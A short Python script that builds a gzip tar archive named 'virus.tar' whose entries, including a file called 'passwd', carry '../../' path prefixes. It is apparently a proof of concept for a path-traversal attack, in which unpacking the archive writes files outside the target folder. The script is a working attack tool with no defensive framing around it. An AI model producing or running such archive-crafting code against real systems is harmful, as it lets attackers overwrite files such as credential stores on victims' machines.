import tarfile

def change_name(tarinfo):
    tarinfo.name = "../../teeeest/" + tarinfo.name
    return tarinfo

def change_name_etc(tarinfo):
    tarinfo.name = "../../teeeest/test/" + tarinfo.name
    return tarinfo

def main():
    tar = tarfile.open("virus.tar", "w:gz")
    tar.add("test", filter=change_name)
    tar.add("passwd", filter=change_name_etc)
    tar.close()

if __name__ == "__main__":
    main()